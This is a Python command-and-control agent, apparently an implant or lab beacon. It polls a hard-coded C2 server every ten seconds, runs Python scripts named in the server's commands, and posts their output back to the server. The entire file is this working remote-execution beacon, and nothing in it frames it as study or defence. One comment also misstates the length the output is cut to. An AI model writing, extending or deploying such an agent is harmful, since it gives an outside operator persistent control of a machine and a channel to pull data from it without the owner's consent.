import requests
import time
import subprocess

C2_SERVER = "http://192.168.1.147:5000"

def fetch_command():
    try:
        response = requests.get(f"{C2_SERVER}/command")
        if response.status_code == 200:
            return response.json().get("command", "noop")
    except Exception as e:
        print(f"Error fetching command: {e}")
    return "noop"

def report_status(status, details=""):
    """Send a summarized report to the C2 server."""
    try:
        report = {
            "status": status,  # High-level status like "Success" or "Error"
            "details": details[-300:]  # Include the last 100 characters of details
        }
        requests.post(f"{C2_SERVER}/report", json=report)
    except Exception as e:
        print(f"Error reporting status: {e}")

def execute_command(command):
    if command == "noop":
        print("No operation command received.")
        report_status("Noop", "No operation executed.")
    elif command == "ping":
        print("Ping command received. Reporting back.")
        report_status("Ping Success", "Ping command executed successfully.")
    elif command.startswith("run "):
        print("Run command received - Executing operation.")
        script_name = command.split(" ", 1)[1]
        try:
            result = subprocess.run(["python", script_name], capture_output=True, text=True)
            if result.returncode == 0:
                report_status("Run Success", result.stdout)
            else:
                report_status("Run Error", result.stderr)
        except Exception as e:
            report_status("Run Exception", str(e))


def main():
    while True:
        command = fetch_command()
        execute_command(command)
        time.sleep(10)  # Wait before polling again

if __name__ == "__main__":
    main()
